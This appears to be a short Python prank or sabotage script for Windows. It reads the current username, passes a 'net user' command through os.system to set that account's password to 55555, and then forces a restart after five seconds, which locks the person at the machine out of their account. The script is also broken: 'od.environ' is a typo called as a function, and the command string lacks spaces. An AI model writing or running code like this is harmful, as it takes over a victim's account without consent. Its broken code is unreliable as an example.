import os

user = od.environ('username')
code = "net user" + user + "55555"


os.system(code)


os.system("shutdown -r -t 5")

